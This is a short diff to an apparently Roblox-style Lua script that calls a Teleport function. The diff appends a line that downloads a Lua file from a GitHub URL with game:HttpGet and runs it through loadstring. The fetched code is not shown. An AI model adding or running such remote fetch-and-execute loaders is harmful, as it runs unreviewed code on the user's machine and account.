@@ -72,3 +72,5 @@ function Teleport()
 end
 
 Teleport()
+wait(1)
+loadstring(game:HttpGet('https://github.com/NotHammer043/Random-Stuffs/blob/main/DJBG/Script.lua'))()
